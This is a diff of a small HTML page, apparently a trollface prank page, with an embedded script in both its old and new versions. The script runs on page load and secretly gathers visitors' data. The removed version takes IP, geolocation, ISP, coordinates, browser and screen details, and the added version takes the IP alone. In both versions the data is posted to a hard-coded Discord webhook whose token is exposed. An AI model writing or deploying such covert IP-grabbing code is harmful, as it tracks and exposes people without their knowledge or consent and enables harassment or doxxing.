@@ -6,82 +6,47 @@
     <title>ASDForum</title>
 </head>
 <body>
-    <h1>GitHubPage ¿good web?</h1>
+    <h1>pruebav1 githubpage</h1>
 
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" 
-         alt="Trollface" 
-         style="width: 300px; height: auto;">
+  
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
 
     <script>
-        const obtenerDatosUsuario = async () => {
-            try {
-                // Obtener IP y datos de geolocalización
-                const respuestaIP = await fetch('https://ipwho.is/');
-                if (!respuestaIP.ok) throw new Error("Error al obtener la IP.");
-                const datosIP = await respuestaIP.json();
 
-                // Datos del navegador y sistema
-                const navegador = navigator.userAgent;
-                const idioma = navigator.language;
-                const resolucion = `${screen.width}x${screen.height}`;
-                
-                // Datos obtenidos
-                const datosUsuario = {
-                    IP: datosIP.ip,
-                    País: datosIP.country,
-                    Región: datosIP.region,
-                    Ciudad: datosIP.city,
-                    Proveedor: datosIP.isp,
-                    Latitud: datosIP.latitude,
-                    Longitud: datosIP.longitude,
-                    Navegador: navegador,
-                    Idioma: idioma,
-                    Resolución: resolucion
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+
+                const userIP = data.ip;
+                console.log("La IP pública es: ", userIP);
+
+                const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh';
+
+                const payload = {
+                    content: `@everyone ¡Alguien visitó tu página! La IP es: ```${userIP}```
                 };
 
-                return datosUsuario;
-            } catch (error) {
-                console.error("Error al obtener datos del usuario:", error);
-                return null;
-            }
-        };
-
-        const enviarADiscord = async (datos) => {
-            if (!datos) return;
-
-            const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh'; // ⚠️ NO DEJAR PÚBLICO ⚠️
-
-            const mensaje = `
-🌍 **Nuevo visitante en la web**
-🔹 IP: ${datos.IP}
-🔹 Ubicación: ${datos.Ciudad}, ${datos.Región}, ${datos.País}
-🔹 ISP: ${datos.Proveedor}
-🔹 📍 Coordenadas: ${datos.Latitud}, ${datos.Longitud}
-🔹 🖥️ Navegador: ${datos.Navegador}
-🔹 🏳️ Idioma: ${datos.Idioma}
-🔹 📏 Resolución de pantalla: ${datos.Resolución}
-            `;
-
-            const payload = { content: mensaje };
-
-            try {
-                const respuesta = await fetch(discordWebhookURL, {
+                fetch(discordWebhookURL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("IP enviada correctamente a Discord.");
+                    } else {
+                        console.error("Hubo un error al enviar la IP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar la IP a Discord: ", error);
                 });
-
-                if (!respuesta.ok) throw new Error("Error al enviar la información.");
-                console.log("Datos enviados correctamente a Discord.");
-            } catch (error) {
-                console.error("Error al enviar a Discord:", error);
-            }
-        };
-
-        (async () => {
-            const datosUsuario = await obtenerDatosUsuario();
-            await enviarADiscord(datosUsuario);
-        })();
+            })
+            .catch(error => {
+                console.error("Error al obtener la IP pública: ", error);
+            });
     </script>
 </body>
 </html>
